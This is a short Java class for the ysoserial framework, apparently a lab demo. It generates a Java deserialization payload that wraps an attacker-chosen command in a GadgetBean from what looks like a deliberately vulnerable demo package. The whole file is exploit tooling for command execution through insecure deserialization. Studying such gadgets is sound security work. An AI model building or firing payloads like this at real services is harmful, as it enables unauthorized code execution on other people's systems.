package ysoserial.payloads;

import com.shen1991.vuln.jdni.GadgetBean;
import ysoserial.payloads.util.PayloadRunner;

public class CustomGadgetDemo implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        return new GadgetBean(command);
    }

    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(CustomGadgetDemo.class, args);
    }
}
